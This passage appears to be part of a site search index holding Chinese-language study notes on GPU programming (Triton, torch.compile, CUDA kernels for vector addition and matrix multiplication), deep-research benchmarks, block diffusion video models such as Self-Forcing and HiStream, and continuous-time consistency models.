<p>\u9762\u5bf9Triton\u4ee3\u7801\uff0c\u6211\u4eec\u8003\u8651\u7684\u4e0d\u662f\u5355\u4e2a\u7ebf\u7a0b\uff0c\u800c\u662f\u7ebf\u7a0b\u5757\uff0c\u4ee5\u81f3\u4e8eTriton\u4ee3\u7801\u4e2d\u90fd\u662fvector\u7684\u64cd\u4f5c\uff0c\u56e0\u4e3a\u6211\u603b\u662f\u518d\u64cd\u4f5c\u4e00\u5757\u6570\u636e</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#64-torch-compile","title":"6.4 torch compile","text":"<p>\u9664\u4e86\u624b\u52a8\u7f16\u5199cuda\u5185\u6838\u4ee5\u53ca\u7528Triton\u6765\u7f16\u5199\u5185\u6838\u4ee5\u5916\uff0c\u6709\u4e00\u79cd\u5f88\u7b80\u4fbf\u7684\u65b9\u6848\u6765\u505a\u7b97\u5b50\u878d\u5408\uff0c\u90a3\u5c31\u662ftorch.compile</p> <p>\u4e4b\u524d\u7684\u4e00\u7cfb\u5217\u624b\u5199\u5185\u6838\u7684\u65b9\u6848\uff0c\u65e0\u975e\u5c31\u662f\u628a\u4e00\u7cfb\u5217\u7684\u5185\u6838\u64cd\u4f5c\u7ec4\u5408\u8d77\u6765\u5f62\u6210\u4e00\u4e2a\u65b0\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u6211\u4eec\u81ea\u7136\u4f1a\u60f3\u6709\u6ca1\u6709\u66f4\u81ea\u52a8\u5316\u7684\u65b9\u6848\u53bb\u505a\u8fd9\u4e9b\u4e1c\u897f</p> <pre><code>compiled_gelu = torch.compile(manual_gelu)\n</code></pre> <p>torch.compile\u4f1a\u505a\u5f88\u591a\u64cd\u4f5c\uff0c\u4e0d\u53ea\u662f\u7b97\u5b50\u878d\u5408\uff0c\u4e5f\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u4f18\u5316tricks\uff0c\u6bd4\u5982\u4f18\u5316\u77e9\u9635\u4e58\u6cd5</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#65-more-about-gpu-coding","title":"6.5 More about GPU coding","text":"<p>\u8fd9\u4e2a\u94fe\u63a5 \u5305\u542b\u4e86\u5f88\u591a\u7684\u8d44\u6e90\uff0c\u53ef\u4ee5\u5e2e\u6211\u4eec\u5165\u95e8GPU coding\uff0c\u4ee5\u53ca\u4e00\u4e9b\u66f4\u52a0\u6df1\u5165\u7684\u5b66\u4e60</p> <p>\u6211\u4e5f\u5c06\u7b14\u8bb0\u8bb0\u5f55\u4e8e\u6b64</p> <p>Cuda\u7684\u7279\u70b9\u5305\u62ec</p> <ul> <li>CPP\u8bed\u6cd5</li> <li>SIMT\uff08Single Instruction Multiple Threads\uff09\u4e00\u4e2a\u6307\u4ee4\u4f1a\u88ab\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u6267\u884c</li> <li>\u9700\u8981\u548cCPU\u534f\u4f5c\uff0cCPU\u6574\u7406\u7ed3\u679c\uff0c\u5904\u7406\u903b\u8f91</li> <li>\u81ea\u52a8\u8c03\u5ea6\uff1a\u6839\u636e\u8bbe\u5b9a\u7684\u6267\u884c\u53c2\u6570\uff0c\u81ea\u52a8\u5206\u914d\u7ebf\u7a0b\u8c03\u5ea6</li> </ul> <p></p> <p>\u6211\u4eec\u5728CPU\u7f16\u5199\u7684\u5faa\u73af\u903b\u8f91\uff0c\u5728GPU\u4e0a\u90fd\u5e94\u8be5\u8f6c\u6362\u6210SIMT\u7684\u903b\u8f91</p> <p>\u5728CUDA\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u5b9a\u4e49\uff0cGrid-&gt;Block-&gt;Threads\uff0c\u76f8\u5bf9\u4e8e\u4e4b\u524d\u7684SM-&gt;Warp-&gt;Thread\uff0c\u6bcf\u4e00\u4e2aThread\u7684ID\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u5b50\u83b7\u5f97</p> <p></p> <p>\u8fd9\u4e5f\u662f\u6211\u4eec\u5728\u6bcf\u4e2aKernel\u51fd\u6570\u6700\u5f00\u59cb\uff0c\u8ba1\u7b97\u81ea\u5df1\u7684Thread\u7684Id\u7684\u65b9\u6848\uff0c\u56e0\u4e3a\u6bcf\u4e2aKernel\u90fd\u662f\u5206\u914d\u7ed9\u4e00\u4e2aSM/Grid\u6267\u884c\u7684\uff0c\u6211\u4eec\u5bf9\u8fd9\u4e2aSM\u7684\u5b9a\u4e49\u7684Block\u6570\u91cf\u548cBlock\u91cc\u7684size\uff0c\u968f\u540e\u5c31\u80fd\u5206\u914dBlock\u7684\u53ef\u6267\u884c\u7684\u7ebf\u7a0b\u4e86</p> <p>ThreadId\u5b9a\u4e49\u4e86\u5f53\u524dThread\u548c\u5176\u4ed6\u7684\u533a\u522b\uff0c\u4e5f\u5c31\u662f\u8fd9\u6837\u5b50\u5b9e\u73b0\u4e86\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\u5728\u591a\u4e2aThread\u6267\u884c\uff0cSIMT</p> <pre><code>int i = blockIdx.x * blockDim.x + threadIdx.x;\n</code></pre> <p>Grid\u548cSM\u7406\u8bba\u4e0a\u662f\u6307\u540c\u4e00\u4e2a\u4e1c\u897f\uff0c\u4f46\u662f\u533a\u522b\u5728\u4e8eGrid\u662f\u903b\u8f91\u4e0a\u7684\u5b58\u5728\uff0c\u5176\u7406\u8bba\u4e0a\u53ef\u4ee5\u5bb9\u91cf\u65e0\u6570\u7684\u7ebf\u7a0b\uff1bSM\u662f\u7269\u7406\u4e0a\u7684\u5b58\u5728\uff0cGrid\u76f8\u5f53\u4e8eSM\u7684\u865a\u62df\u5316\uff0c\u4f46\u662f\u5f53\u8fd9\u4e2a\u7ebf\u7a0b\u6570\u91cf\u8d85\u8fc7\u4e86\u5f53\u524d\u7684SM\u7684\u4e0a\u9650\u65f6\uff0c\u5176\u4f1a\u505a\u4e00\u4e2a\u865a\u62df\u5316\u7684\u5de5\u4f5c\uff0c\u4f1a\u5206\u914d\u5176\u4ed6\u7684SM\u6765\u5e2e\u6211\u5904\u7406\u5f53\u524d\u7684Kernel\u7684\u4efb\u52a1\uff0c\u56e0\u6b64\u4e00\u4e2aKernel\u4e5f\u53ef\u4ee5\u5360\u6ee1GPU\u7684SM</p> <p>Block\u53ea\u80fd\u5b58\u5728\u4e8e\u4e00\u4e2aSM\u4e2d\uff0cGrid\u4e2d\u5305\u542b\u591a\u4e2aBlock\uff0c\u5b9e\u9645\u64cd\u4f5c\u4e2d\u4f1a\u628a\u8be5Block\u5206\u53d1\u5230\u67d0\u4e2a\u5177\u4f53\u7684SM\u4e0a\u6267\u884c\uff0cSM\u4f1a\u89e3\u5305\u8fd9\u4e2aBlock\uff0c\u5c06\u5185\u90e8\u7684\u7ebf\u7a0b\u53d6\u6210warp\u6267\u884c\uff0c\u56e0\u4e3awarp\u5f80\u5f80\u662f32\u4e2a\u7ebf\u7a0b\u4e00\u4e2a\uff0c\u56e0\u6b64Block size\u6700\u597d\u662f32\u7684\u500d\u6570</p> <p>\u4ee5\u4e0b\u662f\u4e00\u4e2a\u7b80\u5355\u7684cuda\u7a0b\u5e8f\uff0c\u6765\u8ba1\u7b97\u5411\u91cf\u52a0\u6cd5</p> <pre><code>#include &lt;cmath&gt;\n#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\n\n#define CUDA_CHECK(call) \\\n{ \\\n    cudaError_t err = call; \\\n    if (err != cudaSuccess) { \\\n        std::cerr &lt;&lt; \"CUDA Error at \" &lt;&lt; __FILE__ &lt;&lt; \":\" &lt;&lt; __LINE__ \\\n        &lt;&lt; \" - \" &lt;&lt; cudaGetErrorString(err) &lt;&lt; std::endl; \\\n    } \\\n}\n\n// Step 3: Define add kernel\ntemplate&lt;typename T&gt;\n__global__ void add_kernel(T *c, const T *a, const T *b, const size_t n, const size_t step) {\n    int idx = blockIdx.x * blockDim.x + threadIdx.x + step;\n    if (idx &lt; n) {\n        c[idx] = a[idx] + b[idx];\n    }\n}\n\ntemplate&lt;typename T&gt;\nvoid vector_add(T *c, const T *a, const T *b, size_t n, const dim3&amp; grid_dim, const dim3&amp; block_dim) {\n    size_t step = grid_dim.x * block_dim.x;\n    for (size_t i = 0; i &lt; n; i += step) {\n        add_kernel&lt;&lt;&lt;grid_dim, block_dim&gt;&gt;&gt;(c, a, b, n, i);\n    }\n}\n\nint main() {\n    // Step 1: Prepare &amp; initialize data\n    constexpr size_t N = 1 &lt;&lt; 20; // ~1M elements\n    constexpr size_t size_bytes = sizeof(float) * N;\n\n    // Initialize data\n    const std::vector&lt;float&gt; h_a(N, 1);\n    const std::vector&lt;float&gt; h_b(N, 2);\n    std::vector&lt;float&gt; h_c(N, 0);\n\n    // Step 2: Allocate device memory &amp; transfer to global memory\n    float *d_a, *d_b, *d_c;\n    CUDA_CHECK(cudaMalloc(&amp;d_a, size_bytes));\n    CUDA_CHECK(cudaMalloc(&amp;d_b, size_bytes));\n    CUDA_CHECK(cudaMalloc(&amp;d_c, size_bytes));\n\n    CUDA_CHECK(cudaMemcpy(d_a, h_a.data(), size_bytes, cudaMemcpyHostToDevice));\n    CUDA_CHECK(cudaMemcpy(d_b, h_b.data(), size_bytes, cudaMemcpyHostToDevice));\n    CUDA_CHECK(cudaMemcpy(d_c, h_c.data(), size_bytes, cudaMemcpyHostToDevice));\n\n    // Step 4: Call the cpu addition function\n    // Set up kernel configuration\n    dim3 block_dim(1);\n    dim3 grid_dim(1);\n\n    // Call cuda add kernel\n    vector_add(d_c, d_a, d_b, N, block_dim, grid_dim);\n\n    // Step 5: Transfer data from global mem to host mem\n    CUDA_CHECK(cudaMemcpy(h_c.data(), d_c, size_bytes, cudaMemcpyDeviceToHost));\n\n    // Step 6: Check for errors (all values should be 3.0f)\n    float sumError = 0.0f;\n    for (int i = 0; i &lt; N; i++) {\n        sumError += fabs(h_c[i] - 3.0f);\n    }\n    std::cout &lt;&lt; \"Sum error: \" &lt;&lt; sumError &lt;&lt; std::endl;\n\n    if (d_a) {\n        CUDA_CHECK(cudaFree(d_a));\n    }\n    if (d_b) {\n        CUDA_CHECK(cudaFree(d_b));\n    }\n    if (d_c) {\n        CUDA_CHECK(cudaFree(d_c));\n    }\n}\n</code></pre> <p>\u8003\u8651Coalesced Memory Access\uff0c\u591a\u4e2a\u7ebf\u7a0b\u8bbf\u95ee\u591a\u4e2a\u8fde\u7eed\u7684\u5185\u5b58\uff0cGPU\u786c\u4ef6\u53ef\u4ee5\u5c06\u5176\u4f18\u5316\u4e3a\u5c11\u51e0\u6b21\u5185\u5b58\u4e8b\u52a1</p> <pre><code>dim3 blockSize(16, 16); // 16x16 = 256 \u7ebf\u7a0b/\u5757\ndim3 gridSize((N + blockSize.x - 1) / blockSize.x, (N + blockSize.y - 1) / blockSize.y);\n\n__global__ void matrixMulGPU(const float* A, const float* B, float* C, int N) {\n    int row = blockIdx.y * blockDim.y + threadIdx.y;\n    int col = blockIdx.x * blockDim.x + threadIdx.x;\n    if (row &lt; N &amp;&amp; col &lt; N) {\n        float sum = 0.0f;\n        for (int k = 0; k &lt; N; ++k) {\n            sum += A[row * N + k] * B[k * N + col];\n        }\n        C[row * N + col] = sum;\n    }\n}\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/DeepResearch/Benchmark/","title":"Benchmark","text":"<ul> <li>https://arxiv.org/pdf/2506.12594 Survey</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/DeepResearch/Benchmark/#search-r1-deepresearcher","title":"Search-R1 &amp; Deepresearcher","text":"<p>NQ\u2020 TriviaQA\u22c6 PopQA\u22c6 HotpotQA\u2020 2wiki\u22c6 Musique\u22c6 Bamboogle\u22c6</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/DeepResearch/Benchmark/#kimi-openai-grok-gemini","title":"Kimi &amp; OpenAI &amp; Grok &amp; Gemini","text":"<p>SEAL-0</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/DeepResearch/Benchmark/#qwen","title":"Qwen","text":"<p>WebWalkQA</p> <p>FRAMES</p> <p>SimpleQA</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/DeepResearch/Benchmark/#miromind","title":"MiroMind","text":"<p>GAIA, HLE, BrowserComp, xBench-deepresearch</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Block%20Diffusion/","title":"Block Diffusion","text":"<ul> <li>Single Prompt Block Diffusion<ul> <li>Self Forcing, Self Forcing ++</li> <li>Rolling Forcing</li> </ul> </li> <li>Multiple Prompts<ul> <li>Longlive</li> <li>Block Vid</li> </ul> </li> <li>dLLM block diffusion<ul> <li>Fast-Dllm v2</li> </ul> </li> <li>Efficient<ul> <li>Stream Diffusion v2</li> <li>DeepForcing</li> </ul> </li> <li>Context Forcing https://chenshuo20.github.io/Context_Forcing/</li> <li>Live</li> <li>Rolling Forcing https://arxiv.org/pdf/2509.25161</li> <li>casual forcing https://thu-ml.github.io/CausalForcing.github.io/</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Block%20Diffusion/#1-self-forcing","title":"1. Self-Forcing","text":"<p>\u524d\u7f6e\u5de5\u4f5c\u6709\u5305\u62ec</p> <ul> <li>Teacher Forcing \u6700\u539f\u59cb\u7684ar diffusion\uff0c\u8bad\u7ec3\u770bgt frames\uff0c\u63a8\u7406\u770b\u81ea\u5df1\u751f\u6210\u7684frames</li> <li>Diffusion Forcing \u5728Teacher Forcing\u7684\u57fa\u7840\u4e0a\uff0c\u5728\u8bad\u7ec3\u4e2d\uff0c\u5728gt frames\u4e0a\u589e\u52a0\u4e00\u4e9b\u566a\u58f0\uff0c\u8fdb\u884c\u8bad\u7ec3\uff0c\u63a8\u7406\u7684\u65f6\u5019\u4e5f\u662f\u770b\u81ea\u5df1\u751f\u6210\u7684frames\uff0cDF\u8ba4\u4e3a\u5728\u8bad\u7ec3\u65f6\u52a0\u5165\u968f\u673a\u566a\u58f0\u7684\u65b9\u6848\uff0c\u53ef\u4ee5\u63d0\u9ad8\u6a21\u578b\u5e94\u5bf9\u9519\u8bef\u7d2f\u79ef\u7684\u9c81\u68d2\u6027</li> </ul> <p>self-forcing \u662f Block Diffusion \u8303\u5f0f\u4e0b\u6bd4\u8f83\u65b0\u7684\u5de5\u4f5c\uff0c\u4e3b\u8981\u662f\u89e3\u51b3block diffusion\u4e4b\u524d\u5728\u8bad\u7ec3\u8fc7\u7a0b\u4e2d\u7684\u4e0a\u4e0b\u6587\u4e3agt\uff0c\u800c\u63a8\u7406\u8fc7\u7a0b\u4e2d\u7684\u4e0a\u4e0b\u6587\u4e3a\u81ea\u5df1\u751f\u6210\u7684\u5185\u5bb9\uff0c\u56e0\u6b64\u5bfc\u81f4\u8bef\u5dee\u7d2f\u79ef\u7684\u95ee\u9898</p> <p></p> <p>\u975e\u5e38\u7b80\u5355\u7684\u60f3\u6cd5\u5c31\u662f\u5728\u8bad\u7ec3\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0a\u4e0b\u6587\u5c31\u662f\u81ea\u5df1\u751f\u6210\u7684\u5185\u5bb9</p> <p>\u76f8\u5bf9\u5e94\u7684\uff0c\u5728Self-Forcing\u4e2d\uff0cLoss\u7684\u76d1\u7763\u4e5f\u4ece\u5bf9\u4e8eNext Frame\u7684\u76d1\u7763\uff0c\u6539\u4e3a\u4e86\u6574\u6bb5\u89c6\u9891\u7684\u76d1\u7763\u3002\u5728\u8fd9\u79cd\u81ea\u56de\u5f52\u751f\u6210\u5e76\u4e14\u6574\u4f53\u89c6\u9891\u76d1\u7763\u7684\u8303\u5f0f\u4e0b\uff0c\u8bad\u7ec3\u7684\u8d44\u6e90\u5f00\u9500\u4f1a\u53d8\u5f97\u975e\u5e38\u5927\uff0c\u56e0\u6b64Self Forcing\u4e2d\u4e5f\u63d0\u51fa\u4e86\u5f88\u591a\u7684Efficient\u7684\u65b9\u6848</p> <ul> <li>\u9636\u6bb5\u6027\u7684\u8bad\u7ec3\uff0c\u7528Self Forcing\u6765\u5fae\u8c03\u4e4b\u524d\u7684Forcing\u6a21\u578b\uff0c\u800c\u4e0d\u662f\u4ece\u5934\u5f00\u59cb\u9884\u8bad\u7ec3</li> <li>Rolling KV-cache</li> <li>Gradient Truncation \u68af\u5ea6\u622a\u65ad</li> </ul> <p>Self Forcing \u4ee3\u7801\u89e3\u8bfb</p> <p>\u63a8\u7406\u6d41\u7a0b</p> <p>\u5bf9\u4e8eSelf-Attention\u7684Transformer\u6765\u8bf4\uff0c\u53ea\u6709Attention\u64cd\u4f5c\u5b58\u5728token\u95f4\u7684\u4ea4\u4e92\uff0c\u5176\u4ed6\u6240\u6709\u7684\u64cd\u4f5c\u90fd\u662ftoken\u72ec\u7acb\u7684</p> <p>\u9996\u5148\u6211\u4eec\u8981\u77e5\u9053\u73b0\u4ee3video generation\u7684dit\u7684\u67b6\u6784\uff0cwan\u7684dit\u67b6\u6784\u4e2d\u517c\u5177Self-Attention\u548cCross Attention\uff0c\u5176\u4e2d\u7684Self Attention\u4e2d\u5e94\u75283D\u7684rope\uff0c\u56e0\u4e3a\u6709\u65f6\u95f4\uff0c\u957f\uff0c\u5bbd\u4e09\u4e2a\u7ef4\u5ea6\uff0cLLM\u662f1\u7ef4\u7684Rope</p> <p>\u8bad\u7ec3\u6d41\u7a0b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Block%20Diffusion/#histream","title":"HiStream","text":"<p>\u4f7f\u7528Block Diffusion\u7684\u8303\u5f0f\uff0c\u751f\u6210\u6d41\u5f0f\u7684\uff0c\u9ad8\u6548\u7684\uff0c\u9ad8\u5206\u8fa8\u73871080P\u89c6\u9891\u751f\u6210</p> <p>\u5176\u91c7\u7528\u7684\u52a0\u901f\u65b9\u6848\u662f\u8fd9\u6837\u5b50\u7684</p> <ul> <li>\u7a7a\u95f4\u538b\u7f29\uff1a\u524d\u4e24\u6b65\u751f\u6210\u4f4e\u5206\u8fa8\u7387\u7684\uff0c\u540e\u9762\u51e0\u6b65\u751f\u6210\u9ad8\u5206\u8fa8\u7387\u7684\uff0c\u53ea\u505a\u7ec6\u8282\u7cbe\u4fee</li> <li>\u65f6\u95f4\u538b\u7f29\uff1a\u751f\u6210\u7684\u65f6\u5019\uff0cKV-cache\uff0c\u53ea\u4fdd\u7559\u7b2c\u4e00\u5e27\u548c\u6700\u8fd1\u7684M-1\u5e27\uff0c\u4fdd\u7559\u6709\u4e0a\u9650\u7684KV-cache</li> <li>\u6b65\u6570\u538b\u7f29\uff1a\u91c7\u7528\u84b8\u998f\u7684\u65b9\u6848\uff0c\u5c06\u751f\u6210\u6b65\u6570\u538b\u7f29\u52304\u6b65</li> </ul> <p>\u76f8\u5173\u5de5\u4f5c\u6574\u7406\u6709</p> <ul> <li>\u9ad8\u5206\u8fa8\u7387</li> </ul> <p>\u9ad8\u5206\u8fa8\u7387\u89c6\u89c9\u751f\u6210</p> <ul> <li>\u76f4\u63a5\u9ad8\u5206\u8fa8\u7387\u8bad\u7ec3 UltraPixel, Turbo2K</li> <li>Training-Free: I-MAX, CineScale, FreeScale</li> <li>\u8d85\u5206: Real-ESRGAN, FlashVSR</li> </ul> <p>\u9ad8\u6548\u89c6\u89c9\u751f\u6210</p> <ul> <li>\u7a00\u758f\u548c\u6ed1\u52a8\u7a97\u53e3\uff0cMOC, FasterCache, videoLCM</li> <li>\u6d41\u5f0f\u6269\u6563: Self-Forcing, Magvi-1, Streaming Diffusion</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Consistency%20model/","title":"Consistency model","text":"<ul> <li>DDPM</li> <li>EDM</li> <li>Consistency Model</li> <li>sCM</li> <li>rCM</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Consistency%20model/#1-continuous-time-consistency-model","title":"1. Continuous-Time Consistency Model","text":"<p>\u8fd9\u7bc7\u5de5\u4f5c\u662f\u6765\u81eaOpenAI\u7684\uff0c\u8fde\u7eed\u65f6\u95f4\u7684\u4e00\u81f4\u6027\u6a21\u578b\uff0c\u6700\u5f00\u59cb\u7684consistency model\u662f\u79bb\u6563\u7684\uff0c\u5b58\u5728\u79bb\u6563\u5bfc\u81f4\u7684\u8bef\u5dee\u7d2f\u79ef\u95ee\u9898\uff0c\u5e76\u4e14\u5f15\u5165\u4e86\u989d\u5916\u7684\u8d85\u53c2\u6570</p> <p>\u4ee5\u524d\u7684\u8fde\u7eed\u65f6\u95f4\u7684\u65b9\u6848\u90fd\u5b58\u5728\u8bad\u7ec3\u4e0d\u7a33\u5b9a\u7684\u95ee\u9898\uff0c\u8fd9\u7bc7\u8bba\u6587\u6574\u4f53\u5ba1\u89c6\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5c06Diffusion Model\u548cConsistency Model\u7eb3\u5165\u5230\u540c\u4e00\u4e2a\u7406\u8bba\u6846\u67b6\u4e2d</p> <p>CM\u7684\u6838\u5fc3\u76ee\u6807\u8fd8\u662f\u52a0\u901fDiffusion model\uff0c\u4f46\u662f\u76f8\u6bd4\u4e8e\u5404\u79cd\u84b8\u998f\u8303\u5f0f\u800c\u8a00\uff0c\u5b83\u672c\u8eab\u662f\u4e00\u7c7b\u72ec\u7acb\u7684\u6a21\u578b\uff0c\u6709\u72ec\u7279\u7684\u91c7\u6837\u4f18\u52bf\uff0c\u4f46\u662fCM\u540c\u6837\u5b58\u5728\u6548\u679c\u4e0d\u5982multi-step\u7684diffusion\uff0c\u4ee5\u53ca\u8bad\u7ec3\u4e5f\u66f4\u4e0d\u7a33\u5b9a\u7684\u7f3a\u9677</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Consistency%20model/#11-trigflow","title":"1.1. TrigFlow","text":"<p>\u8fd9\u662f\u4e00\u5957\u7406\u8bba\u6846\u67b6\uff0c\u4e5f\u662f\u8fd9\u7bc7\u8bba\u6587\u7684\u7b2c\u4e00\u4e2a\u8d21\u732e\uff0c\u7edf\u4e00\u4e86EDM\u548cFlow Matching\uff0c\u5e76\u4e14\u663e\u8457\u7b80\u5316\u4e86Diffusion\u76f8\u5173\u7684\u7406\u8bba\u516c\u5f0f</p> \\[x_t =  \\alpha_tx_0\\ +\\ \\sigma_tz\\] <p>\u8fd9\u662fDiffusion\u8fc7\u7a0b\u6700\u6838\u5fc3\u7684\u5f0f\u5b50\uff0c\u5f88\u591a\u53d8\u5f0f\u90fd\u662f\u5728\u8c03\u6574\\(\\alpha_t\\)\u548c\\(\\sigma_t\\)\u8fd9\u4e24\u4e2a\u7cfb\u6570</p> <p>EDM</p> <p>\u5728EDM\u4e2d\u6211\u4eec\u8bbe\u7f6e \\(\\alpha_t=1, \\sigma_t=t\\) \u5728\u8fd9\u4e2a\u5b9e\u73b0\u4e2d\uff0c\u539f\u59cb\u56fe\u50cf\u7684\u6743\u91cd\u4fdd\u6301\u4e0d\u53d8\uff0c\u53ea\u662f\u968f\u7740\u65f6\u95f4\u589e\u52a0\uff0c\u566a\u58f0\u7684\u6bd4\u4f8b\u4e00\u76f4\u589e\u52a0\uff0c\u5176\u6838\u5fc3\u7684\u8bad\u7ec3\u76ee\u6807\u5982\u4e0b</p> \\[\\mathbb{E}[w(t) \\| f_\\theta^{DM}(x_t, t) - x_0\\|^2]\\] <p>\u5176\u4e2d\\(w(t)\\)\u662f\u4e00\u4e2a\u6743\u91cd\u7cfb\u6570\uff0c\u56e0\u4e3a\u4e0d\u540c\u65f6\u95f4\u6b65\u6570\u7684\u53bb\u566a\u96be\u5ea6\u4e0d\u4e00\u6837\uff0c\u5176\u4e2d\\(f_\\theta\\)\u662f\u6211\u4eec\u7684\u795e\u7ecf\u7f51\u7edc\uff0c\u7ed9\u5b9a\\(x_t\\)\u6211\u4eec\u5e0c\u671b\u5176\u9884\u6d4b\u5e72\u51c0\u7684\\(x_0\\)\uff0c\u8fd9\u4e2a\u65b9\u6848\u5f53\u7136\u5728\u4e0d\u540c\u65f6\u95f4\u6b65\u4e0b\u96be\u5ea6\u4e0d\u540c\uff0c\u56e0\u6b64\u9700\u8981\u52a0\u6743\u6765\u907f\u514d\u8bad\u7ec3\u5d29\u6e83</p> <p>\u5176\u4e2dEDM\u7684\u7f51\u7edc\u7ed3\u679c\u5f62\u5f0f\u5316\u5982\u4e0b</p> <p>Flow Matching</p> <p>\u5728Flow matching\u6211\u4eec\u8bbe\u7f6e \\(\\alpha_t=1-t, \\sigma_t=t\\) \uff0c\u5176\u8bad\u7ec3\u76ee\u6807\u5982\u4e0b\uff0c\u662f\u6211\u4eec\u5f88\u719f\u6089\u7684\u9884\u6d4b\u901f\u5ea6\u573a\u7684\u7ed3\u679c\uff0c\u516c\u5f0f\u91cc\u9762\u8868\u73b0\u4e3a\u7cfb\u6570\u7684\u68af\u5ea6\u7684\u8ba1\u7b97</p> \\[\\mathbb{E}[w(t) \\| f_\\theta^{DM}(x_t, t) - (\\alpha_t^{\\prime}x_0+\\sigma_t^{\\prime}z)\\|^2]\\] <p>PF-ODE\u7684\u6982\u5ff5\uff0cEDM\u548cFlow Matching\u672c\u8d28\u4e0a\u90fd\u662f\u4f7f\u7528\u4e86PF-ODE\uff0c\u8fd9\u4e5f\u662fSong Yang\u63d0\u51fa\u7684\u4e00\u5957\u7406\u8bba\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u968f\u673a\u7684 SDE \u6269\u6563\u8fc7\u7a0b\uff0c\u90fd\u5b58\u5728\u4e00\u4e2a\u5b8c\u5168\u786e\u5b9a\u7684 ODE \u8fc7\u7a0b\uff0c\u5b83\u4eec\u7684\u8fb9\u7f18\u6982\u7387\u5206\u5e03\u662f\u5b8c\u5168\u4e00\u6a21\u4e00\u6837\u7684\u3002</p> <p>Discrete Consistency Model</p> <p>\u6211\u4eec\u8fd8\u662f\u4ece\u8bad\u7ec3\u76ee\u6807\u5f00\u59cb\uff0c\u9996\u5148\u6211\u4eec\u6765\u770bDiscrete-time CM\u7684\u8bad\u7ec3\u76ee\u6807\uff0c\u5b8f\u89c2\u7406\u89e3\u4e0a\uff0c\u8fd9\u4e2aCM\u7684\u76ee\u6807\u5e94\u8be5\u662f\u62c9\u8fd1\u4e24\u4e2a\u65f6\u95f4\u6b65\u4e4b\u95f4\u7684\u9884\u6d4b\u7ed3\u679c\uff0c\u5e76\u4e14\u589e\u52a0\u4e00\u4e2a\u786c\u6027\u7ea6\u675f\u4e5f\u5c31\u662f\u5f53t=0\u7684\u65f6\u5019\uff0c\u8f93\u51fa\u7b49\u4e8e\u771f\u5b9e\u56fe\u50cf\uff0c\u901a\u8fc7\u8fd9\u4e24\u4e2a\u7ea6\u675f\u5c31\u53ef\u4ee5\u4f18\u5316\u4e00\u4e2a\u4e00\u81f4\u6027\u6a21\u578b</p> \\[\\mathbb{E}_{\\boldsymbol{x}_t, t} \\left[ w(t) d\\big( \\boldsymbol{f}_\\theta(\\boldsymbol{x}_t, t), \\boldsymbol{f}_{\\theta^-}(\\boldsymbol{x}_{t-\\Delta t}, t - \\Delta t) \\big) \\right],\\] <p>\u8fd9\u91cc\u7684d\u662f\u6307\u5ea6\u91cf\u51fd\u6570\uff0c\u4e00\u822c\u548c\u4e0a\u8ff0\u51e0\u4e2a\u76ee\u6807\u4e00\u6837\uff0c\u4e5f\u662f\u91c7\u7528L2 Loss\u7b49</p> <p>\u5b9e\u9a8c\u4e2d\u53d1\u73b0\uff0cDiscrete Consistency Model\u7684\u8bad\u7ec3\u5bf9\u4e8e\\(\\Delta t\\)\u7684\u9009\u53d6\u975e\u5e38\u654f\u611f\uff0c\u5e76\u4e14\u5b58\u5728\u8bef\u5dee\u7d2f\u79ef\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u672c\u8d28\u4e0a\u6211\u4eec\u83b7\u53d6\\(\\boldsymbol{x}_{t-\\Delta t}\\)\u662f\u9700\u8981\u4ece\\(x_t\\)\u6c42\u89e3ODE\u6765\u7684\uff0c\u4f46\u662fODE\u7684\u6c42\u89e3\u5374\u4e00\u822c\u5f97\u7528Euler\u7b49\u6570\u503c\u6cd5\u6765\u8fd1\u4f3c\uff0c\u8fd9\u91cc\u5c31\u5b58\u5728\u8bef\u5dee\uff0c\u672c\u8eabLoss\u7684\u8ba1\u7b97\u9700\u8981\u8fd1\u4f3c\u4f1a\u5bfc\u81f4\u8bad\u7ec3\u4ea7\u751f\u504f\u5dee</p> <p>Contiuous Consistency Model</p> 